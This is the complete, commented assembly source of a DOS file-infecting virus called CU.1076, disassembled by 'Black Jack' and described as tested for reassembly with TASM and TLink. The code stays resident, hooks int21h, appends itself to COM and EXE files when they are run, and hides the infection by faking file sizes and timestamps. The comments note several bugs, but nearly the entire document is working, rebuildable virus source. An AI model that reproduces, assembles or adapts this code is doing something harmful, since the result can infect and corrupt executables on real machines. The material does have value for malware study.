comment \

Name            : CU.1076 (according to AVP, obviously named after infection
                : marker in CRC field of EXE header.
Author          : ?
Type            : TSR EXE/COM infector with sizestealth
Size            : 1076 bytes
Origin          : ?
When            : ?
Status          : ?
Disassembled by : Black Jack

Description:
When an infected file is executed, the virus gains control and goes TSR by
the standart MCB method and hooks int21h. It then infects COM and EXE files
when they are executed or loaded by function 4Bh. The infection process is
100% standart. Date, Time and Attributes are stored (except that the seconds
filed holds the infection mark 60), and a dummy int24h is installed during
infection. Also, the virus uses size stealth for FCB (functions 11h, 12h)
handle (functions 4Eh, 4Fh) and Win95 (functions 714Eh, 714Fh), although
the handle stealth won't work because of lots of bugs. Also it has a kind
of time-stealth, on the get time function (5700h) it returns the seconds
field of the last infected file to hide its infection mark.

Comments:
This is just a stupid and boring DOS virus, I just disassembled it because
of great boredom and because I had found an infected file on my mothers PC
(but please don't ask me how it came there). Its full of bugs and rubbish.

Reassembly tested with Tasm 3.1 and TLink 3.0 .

        TASM /M cu
        TLINK /t cu

\


virus_size      =       (v_end - v_start)

.model tiny
.286
.code
org 100h
start:
        nop                             ; dummy host
        nop
        nop


v_start:
	push    es                      ; save PSP segment

	call    next                    ; calculate delta offset
next:
	pop     bp
	sub     bp,offset next          ; BP=delta offset

	mov     ax,1818h                ; already resident?
	int     21h
	cmp     bx,0C001h
	je      already_resident        ; yes, we're there

	mov     ax,ds                   ; AX=PSP segment
	dec     ax                      ; AX=MCB segment
	mov     ds,ax                   ; DS=MCB segment
        mov     cl,"M"                  ; marker: not the last MCB
	xchg    ds:[0],cl               ; mark our MCB as not the last
	sub     word ptr ds:[3],40h     ; resize MCB
	sub     word ptr ds:[12h],40h   ; end segment of this program
	mov     bx,ds:[12h]             ; BX=segment of new virus MCB
	mov     ds,bx                   ; DS=segment of new virus MCB
	inc     bx                      ; BX=segment of the virus
	mov     es,bx                   ; ES=segment of the virus
	mov     ds:[0],cl               ; marker of virus MCB
	mov     word ptr ds:[1],8       ; mark as system MCB
	mov     word ptr ds:[3],3Fh     ; set virus segment size in MCB

	push    cs                      ; DS=CS
	pop     ds
	xor     di,di                   ; DI=0
	lea     si,[bp+v_start]		; SI=start of virus code
	mov     cx,virus_size           ; CX=size of virus
	cld                             ; clear direction flag
	rep     movsb                   ; copy virus to TSR location

	push    es                      ; save virus segment

	push    es                      ; DS=ES=virus segment
	pop     ds

	mov     ax,3521h                ; get int21h vector
	int     21h
        mov     ds:[int21h_offset-v_start],bx       ; save it
        mov     ds:[int21h_segment-v_start],es

	pop     es                      ; ES=virus segment

	mov     ax,2521h                ; set new int21h vector
        mov     dx,(int21h_handler-v_start) ; DS:DX=new int handler
	int     21h

already_resident:
	pop     es                      ; ES=PSP segment
	push    cs                      ; DS=CS
	pop     ds

	cmp     cs:[bp+host_type],"XE"  ; is host an EXE?
	je      restore_exe

restore_com:
	lea     si,[bp+header]          ; original first bytes of host
	mov     di,100h
        cld                             ; clear direction flag
	movsw                           ; move start of host back
	movsb

	push    es                      ; DS=ES=PSP segment
	pop     ds
	push    100h                    ; jump to host start
	ret

restore_exe:
	mov     ax,es                   ; AX=ES=PSP segment
	add     ax,10h                  ; AX=start segment of image
	push    es                      ; DS=ES=PSP segment
	pop     ds
	add     word ptr cs:[bp+host_cs],ax   ; relocate jump to host
	add     ax,word ptr cs:[bp+host_ss]   ; relocate host SS
	mov     ss,ax                         ; restore host SS
	mov     sp,word ptr cs:[bp+host_sp]   ; restore host SP

	db      0EAh                    ; jmp far opcode
host_ip         dw      ?
host_cs         dw      ?

host_ss         dw      ?
host_sp         dw      ?

int21h_handler:
	cmp     ax,1818h                ; residency check
	jne     no_residency_check
	mov     bx,0C001h               ; we're already installed
	iret                            ; quit interrupt execution

no_residency_check:
	cmp     ah,4Bh                  ; load/execute file
	jne     no_exec
	jmp     infect

no_exec:
        cmp     ah,11h                  ; FCB find first file?
        je      fcb_stealth
        cmp     ah,12h                  ; FCB find next file?
        je      fcb_stealth

        cmp     ah,4Eh                  ; handle find first file?
        jne     no_findfirst_handle
        jmp     handle_stealth
no_findfirst_handle:
        cmp     ah,4Fh                  ; handle find next file?
        jne     no_findnext_handle
        jmp     short handle_stealth
	nop
no_findnext_handle:

        cmp     ax,714Eh                ; LFN find first file?
        jb      no_LFN_stealth
        cmp     ax,714Fh                ; LFN find next file?
        ja      no_LFN_stealth
        jmp     LFN_stealth

no_LFN_stealth:
        cmp     ax,5700h                ; get file date/time?
	jne     org_int21h              ; Jump if not equal
        jmp     time_stealth

org_int21h:
		db      0EAh
int21h_pointer  equ     this dword
int21h_offset   dw      ?
int21h_segment  dw      ?


; ----- FCB STEALTH ---------------------------------------------------------
fcb_stealth:
        pushf                           ; simulate int21h call
        call    dword ptr cs:[int21h_pointer-v_start]

        pushf                           ; save flags
        pusha                           ; save all regs
        push    ds                      ; save segments
	push    es

        or      al,al                   ; FCB search failed?
        jnz     exit_fcb_stealth        ; if so, quit stealth routine

        mov     ah,51h                  ; get active PSP segment to BX
	int     21h

        mov     es,bx                   ; ES=active PSP segment
        cmp     bx,es:[16h]             ; is it COMMAND.COM calling?
        jne     exit_fcb_stealth        ; if not, don't do stealth

        mov     ah,2Fh                  ; get DTA to ES:BX
	int     21h

        push    es                      ; DS:BX=DTA
	pop     ds

        cwd                             ; DX=0

        cmp     byte ptr [bx],0FFh      ; is it an extended FCB?
        jne     no_extended_fcb
        add     bx,7                    ; convert to regular FCB
no_extended_fcb:
        mov     cl,[bx+17h]             ; CL=low byte of filetime
        and     cl,00011111b            ; CL=seconds
        cmp     cl,1Dh                  ; seconds=60 means infected
        jne     exit_fcb_stealth        ; if not, then exit stealth routine

        mov     ax,[bx+9]               ; AX:CL=file extension
	mov     cl,[bx+1Bh]
        cmp     ax,"OC"                 ; is it a COM file?
        jne     fcb_stealth_no_com
        cmp     cl,"M"
        jne     exit_fcb_stealth        ; its not an EXE/COM
        jmp     short do_fcb_stealth
        nop
fcb_stealth_no_com:
        cmp     ax,"XE"                 ; is it an EXE file?
        jne     exit_fcb_stealth        ; its not an EXE/COM
        cmp     al,"E"
        jne     exit_fcb_stealth        ; its not an EXE/COM
do_fcb_stealth:
        sub     word ptr [bx+1Dh],virus_size    ; stealth filesize
        sbb     word ptr [bx+1Ch],0             ; stealth filesize

exit_fcb_stealth:
        pop     es                      ; restore setment registers
	pop     ds
        popa                            ; restore all regs
        popf                            ; restore flags
        retf    2                       ; return from INT and keep the flags


; ----- HANDLE STEALTH ------------------------------------------------------
; note: this routine is much to buggy to work.

handle_stealth:
        pushf                           ; push flags
        call    dword ptr cs:[int21h_pointer-v_start]
        jc      findfirstnext_failed

        pushf                           ; save flags
        pusha                           ; save all registers
        push    ds                      ; save segment registers
	push    es
        push    di                      ; save DI (useless)

        mov     ah,2Fh                  ; get DTA to ES:BX
	int     21h
                                        ; BUG! DS should be set to ES here!!!

        mov     cl,[bx+16h]             ; CL=low byte of filetime
        and     cl,00011111b            ; CL=seconds of filetime
        cmp     cl,1Dh                  ; seconds=60 means infected
        jne     exit_handle_stealth

        push    si                      ; save SI (useless)
        lea     si,[bx+1Eh]             ; ES:SI=filename
        call    get_extension           ; get file extension to AX:CL
        pop     si                      ; restore SI

        cmp     ax, "OC"                ; could it be a COM file?
        jne     handle_stealth_no_com   ; check for an EXE
        cmp     cl,"M"                  ; really a COM?
        jne     exit_handle_stealth     ; if not, exit stealth routine
        jmp     short do_handle_stealth
        nop

handle_stealth_no_com:
        cmp     ax,"XE"                 ; could it be an EXE file?
        jne     exit_handle_stealth     ; no EXE/COM, leave stealth routine
        cmp     cl,"E"                  ; really an EXE?
        jne     exit_handle_stealth     ; no EXE/COM, leave stealth routine

do_handle_stealth:
        sub     word ptr es:[bx+1Ah],virus_size ; fixup filesize
                                        ; BUG! hiword of filesize unchanged!!!

exit_handle_stealth:
        pop     di                      ; restore DI
        pop     es                      ; restore segment registers
        pop     ds
        popa                            ; restore all registers
        popf                            ; restore flags

findfirstnext_failed:
        retf    2                       ; return from INT and keep the flags


; ----- LONG FILENAME (WIN95) STEALTH ---------------------------------------
LFN_stealth:
        pushf                           ; simulate int21h call
        call    dword ptr cs:[int21h_pointer-v_start]
                                        ; ES:DI=finddata structure

        pushf                           ; save flags
        pusha                           ; save all regs
        push    ds                      ; save segments
	push    es

        jc      exit_lfn_stealth        ; exit on error
        nop
	nop
        push    es                      ; DS=ES
	pop     ds

        mov     ax,si                   ; SI=DateTimeFormat
        cmp     ax,1                    ; 1 means DOS format for date/time
        je      dos_datetime_format
	nop
	nop
        mov     ax,71A7h                ; convert date/time format
        xor     bl,bl                   ; BL=0: Win95 format to DOS format
        mov     si,di
        add     si,14h                  ; DS:SI=ptr to filetime
        pushf                           ; simulate int21h call
	call    dword ptr cs:[int21h_pointer-v_start]
                                        ; return CX=filetime, DX=filedate
        jmp     short filetime_in_CX
	nop                             ; stupid single-pass assembler

dos_datetime_format:
        mov     cx,es:[di+14h]          ; get filetime in CX
filetime_in_CX:
        and     cl,00011111b            ; CL=file seconds
        cmp     cl,1Dh                  ; seconds=60 means infected
        jne     exit_lfn_stealth        ; if not, exit stealth routine
	nop
	nop

        push    si                      ; save SI (useless)
        lea     si,[di+2Ch]             ; DS:SI=filename ptr
        call    get_extension           ; get filename extension to AX:CL
        pop     si                      ; restore SI

        cmp     ax,"OC"                 ; could it be a COM file?
        jne     lfn_stealth_no_com      ; not a COM
	nop
	nop
        cmp     cl,"M"                  ; really a COM?
        jne     exit_lfn_stealth        ; no COM/EXE, leave stealth routine
	nop
	nop
        jmp     short do_lfn_stealth
        nop

lfn_stealth_no_com:
        cmp     ax,"XE"                 ; could it be an EXE file?
        jne     exit_lfn_stealth        ; if not, leave stealth routine.
	nop
	nop
        cmp     cl,"E"                  ; is it really an EXE?
        jne     exit_lfn_stealth        ; no COM/EXE, leave stealth routine
	nop
        nop

do_lfn_stealth:
        sub     word ptr es:[di+20h],virus_size ; fixup filesize
	sbb     word ptr es:[di+22h],0

exit_lfn_stealth:
        pop     es                      ; restore segment registers
	pop     ds
        popa                            ; restore all registers
        popf                            ; restore flags
        retf    2                       ; return from INT and keep the flags

; ----- GET THE FILE EXTENSION ----------------------------------------------
get_extension:
        lodsb                           ; get a char from filename
        cmp     al,"."                  ; end of filename?
        jne     get_extension           ; if not, search on

        cld                             ; clear direction - useless here
        lodsw                           ; get first 2 bytes of extension to AX
        xchg    cx,ax                   ; move them to CX
        cld                             ; clear direction - useless again
        lodsb                           ; get last byte of extension to AL
        xchg    cx,ax                   ; AX:CL=file extension
        ret


; ----- TIME STEALTH --------------------------------------------------------
time_stealth:
	pushf                           ; Push flags
	call    dword ptr cs:[int21h_pointer-v_start]

        pushf                           ; save flags
        pusha                           ; save all registers
        push    ds                      ; save segment registers
	push    es

        and     cl,00011111b            ; CL=seconds of filetime
        cmp     cl,1Dh                  ; seconds=60 means infected
        jne     no_time_stealth
        and     cx,11100000b            ; clear seconds of filetime
        add     cl,byte ptr cs:[seconds-v_start]  ; set new seconds field
no_time_stealth:
        pop     es                      ; restore segment registers
	pop     ds
        popa                            ; restore all registers
        popf                            ; restore flags
        retf    2                       ; return from INT and keep the flags


; ----- INFECTION -----------------------------------------------------------
infect:
	pusha                           ; save all registers
	push    ds                      ; save also segment registers
	push    es

	push    ds                      ; save DS (segm to filename)
	xor     ax,ax                   ; AX=0
	mov     ds,ax                   ; DS=AX=0=IVT segment
        mov     ax, offset int24h_handler ; BUG! forgotten to sub v_start
	mov     bx,cs                   ; BX:AX=ptr32 to int24h handler
	cli                             ; disable interrupts
	xchg    ds:[24h*4],ax           ; set new handler to int24h
	xchg    ds:[24h*4+2],bx
	mov     word ptr cs:[int24h_offset-v_start],ax  ; save old
	mov     word ptr cs:[int24h_segment-v_start],bx ; handler
	sti                             ; enable interrupts
	pop     ds                      ; restore DS (filename segm)

	mov     ax,4300h                ; get attributes of victim
	int     21h

	push    dx                      ; save filename pointer of
	push    ds                      ; victim file
	push    cx                      ; save attributes of victim

	mov     ax,4301h                ; reset attributes of victim
	xor     cx,cx                   ; CX=new attributes=0
	int     21h
	jnc     get_attributes_ok
	jmp     reset_attributes

get_attributes_ok:
	mov     ax,3D02h                ; open file r/w
	int     21h                     ; DS:DX=filename ptr
	jnc     openfile_ok
	jmp     reset_attributes

openfile_ok:
	xchg    bx,ax                   ; filehandle to BX

	push    cs                      ; DS=ES=CS
	push    cs
	pop     ds
	pop     es

	mov     ax,5700h                ; get file date/time
	int     21h
	push    cx                      ; save file time
	push    dx                      ; save file date

	mov     ah,3Fh                  ; read file header
        mov     dx, (header-v_start)    ; DS:DX=buffer to read
	mov     cx,1Ch                  ; DOS EXE header size
	int     21h

        cmp     word ptr cs:[header-v_start],"MZ"       ; EXE header?
	jne     probably_not_an_exe
	jmp     infect_exe
probably_not_an_exe:
        cmp     word ptr cs:[2AEh],"ZM"                 ; EXE header?
	jne     not_an_exe
	jmp     infect_exe
not_an_exe:
        cmp     word ptr cs:[header-v_start], -1        ; SYS file?
        jne     infect_com
	jmp     restore_filetime

header  db      1Ch dup(0C3h)           ; 0C3h - ret opcode - quit 1st gen

infect_com:
	mov     ax,4202h                ; goto end of file
	xor     cx,cx                   ; CX:DX=0=distance to move
	cwd
	int     21h                     

	cmp     dx,0                    ; high word of filesize=0 ?
	jbe     com_size_ok             ; if yes, file is too big
	jmp     restore_filetime        ; to infect
com_size_ok:
	push    ax                      ; save filesize
	sub     ax,(virus_size+3)       ; the theoretical offset of
					; the jmp if file was infected
	cmp     ax,word ptr cs:[header-v_start+1] ; equal means
					; the file is already infected
	pop     ax                      ; restore filesize in AX
	jne     com_not_infected_yet
	jmp     restore_filetime
com_not_infected_yet:
	mov     word ptr cs:[host_type-v_start],"OC" ; set host type
	sub     ax,3
	mov     word ptr cs:[jmp_distance-v_start],ax
	add     ax,3                    ; completely useless instruction
		
	mov     ah,40h                  ; write virus body
	mov     dx,0                    ; virus offset in memory
	mov     cx,virus_size           ; CX=size to write
	int     21h
		
	mov     ax,4200h                ; set filepointer to beginning
	xor     cx,cx                   ; CX:DX=distance to move=0
	cwd
	int     21h
		
	mov     ah,40h                  ; write new jump to filestart
        mov     dx,(new_jmp-v_start)    ; DS:DX=ptr to buffer
	mov     cx,3                    ; write three bytes (near jmp)
	int     21h

        pop     dx                      ; restore old file date in DX
        pop     cx                      ; restore old file time in CX
        push    cx                      ; save CX again
        and     cl,00011111b            ; CL=seconds from filetime
        mov     byte ptr cs:[seconds-v_start],cl  ; store it
        pop     cx                      ; restore CX
        and     cl,11100000b            ; clear seconds from filetime
        add     cl,1Dh                  ; mark as infected with seconds=60
        jmp     set_filetime            ; set new filetime
		
		
new_jmp:                
		db      0E9h   
jmp_distance    dw      ?

infect_exe:
        cmp     word ptr cs:[header-v_start+18h],40h    ; Relo table address
	jb      no_new_exe
        jmp     restore_filetime                        ; don't take New EXEs
no_new_exe:
        cmp     word ptr cs:[header-v_start+1Ah],0      ; Overlay number
	je      no_overlay
        jmp     restore_filetime                        ; don't take overlays
no_overlay:
        cmp     word ptr cs:[header-v_start+12h],"UC"   ; CRC/infection mark
	jne     not_infected_yet
        jmp     restore_filetime                        ; don't reinfect
not_infected_yet:
        mov     word ptr cs:[host_type-v_start],"XE"    ; mark host as EXE

        mov     ax,word ptr cs:[header-v_start+0Eh]     ; save SS
	mov     cs:[host_ss - v_start],ax
        mov     ax,word ptr cs:[header-v_start+10h]     ; save SP
        mov     cs:[host_sp - v_start],ax
        mov     ax,word ptr cs:[header-v_start+16h]     ; save CS
	mov     cs:[host_cs - v_start],ax
        mov     ax,word ptr cs:[header-v_start+14h]     ; save IP
	mov     cs:[host_ip - v_start],ax

        mov     ax,4202h                ; go to end of file
        xor     cx,cx                   ; DX:CX=new file pointer
	cwd
	int     21h

        push    bx                      ; save file handle
        push    ax                      ; save filesize
        push    dx                      ; save filesize high

        mov     bx,word ptr cs:[header-v_start+08h]     ; header size (paras)
        shl     bx,4                    ; BX=BX*16 : convert to bytes
        sub     ax,bx                   ; DX:AX=image size
	sbb     dx,0
        mov     cx,10h                  ; divide by 16
        div     cx                      ; calculate new CS/IP
	mov     word ptr cs:[header-v_start+14h],dx         ; IP
	mov     word ptr cs:[header-v_start+16h],ax         ; CS
	mov     word ptr cs:[header-v_start+0eh],ax         ; SS
	mov     word ptr cs:[header-v_start+10h],0FFFEh     ; SP
        mov     word ptr cs:[header-v_start+12h],"UC"       ; CRC/marker

        pop     dx                      ; restore filesize to DX:AX
	pop     ax
        add     ax,virus_size           ; calculate new filesize
	adc     dx,0

        mov     cx,200h                 ; calculate filesize in 512 byte pages
        div     cx
        inc     ax                      ; round up pages
        mov     word ptr cs:[header-v_start+4],ax       ; filesize mod 512
        mov     word ptr cs:[header-v_start+2],dx       ; filesize div 512

        pop     bx                      ; restore file handle

        mov     ah,40h                  ; write virus to EOF file
        mov     cx,virus_size           ; size to write
        mov     dx,0                    ; virus offset in memory
	int     21h

        mov     ax,4200h                ; go to start of file
        xor     cx,cx                   ; DX:CX=new position in file=0
	cwd
	int     21h

        mov     ah,40h                  ; write new EXE header
        mov     dx, (header-v_start)    ; DS:DX=buffer to read
        mov     cx,1Ch                  ; DOS EXE header size
	int     21h


        pop     dx                      ; restore old file date in DX
        pop     cx                      ; restore old file time in CX
        push    cx                      ; save CX again
        and     cl,00011111b            ; CL=seconds from filetime
        mov     byte ptr cs:[seconds-v_start],cl  ; store it
        pop     cx                      ; restore CX
        and     cl,11100000b            ; clear seconds from filetime
        add     cl,1Dh                  ; mark as infected with seconds=60
        jmp     set_filetime            ; set new filetime
	nop                             ; single-pass assembler shit

int24h_handler:
	iret                            ; Interrupt return

int24h_offset   dw      ?
int24h_segment  dw      ?

restore_filetime:
        pop     dx                      ; restore old file date in DX
        pop     cx                      ; restore old file time in CX

set_filetime:
        mov     ax,5701h                ; set file time/date
	int     21h

	mov     ah,3Eh                  ; close file
	int     21h

        mov     ax,5700h                ; get file time/date
	int     21h

reset_attributes:
	pop     cx                      ; restore old file attributes
	pop     ds                      ; restore pointer to filename
	pop     dx                      ; in DS:DX
	mov     ax,4301h                ; set file attributes funct.
	int     21h

	xor     ax,ax                   ; AX=0
	mov     ds,ax                   ; DS=AX=0=IVT segment
        mov     ax,word ptr cs:[int24h_offset-v_start]  ; BX:AX=ptr32 to old
        mov     bx,word ptr cs:[int24h_segment-v_start] ; int24h handler
	cli                             ; disable interrupts
	mov     ds:[24h*4],ax           ; restore old int24h handler
	mov     ds:[24h*4+2],bx
	sti                             ; enable interrupts

	pop     es                      ; restore segment registers
	pop     ds
	popa                            ; restore all other registers
	jmp     org_int21h

host_type       dw      "OC"            ; first generation is a COM
seconds         db      0
v_end:

		end     start
